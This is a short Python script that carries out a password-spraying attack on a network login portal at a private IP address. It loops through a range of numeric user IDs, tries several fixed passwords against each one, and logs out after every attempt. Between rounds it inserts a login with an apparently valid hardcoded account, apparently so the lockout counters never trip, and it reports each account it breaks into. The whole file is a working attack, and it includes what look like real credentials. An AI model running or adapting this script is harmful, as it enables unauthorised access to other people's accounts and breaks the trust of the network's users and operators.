import requests, time

url = "http://172.16.68.6:8090/login.xml"

def login(user, passwd):
    req = {'mode': '191', 'username': user, 'password': passwd}
    x = requests.post(url, data=req)
    if x.text[90] == 'Y':
        return f'[+] SUCESS User = {user}, Pass = {passwd}'
    else:
        return f'[-] {user} Failure :('

def logout(user):
    req = {'mode': '193', 'username': user}
    x = requests.post(url, data=req)

def correct_attempt():
    login("19102168", "178045HI")

for en in range(21103300, 21103400, 2):
    print(login(en, "357043AR"))
    time.sleep(1)
    logout(en)
    print(login(en, "179001AS"))
    time.sleep(1)
    logout(en)
    print(login(en+1, "179001AS"))
    time.sleep(1)
    logout(en)
    print(login(en+1, "179001AS"))
    time.sleep(1)
    logout(en)
    correct_attempt()
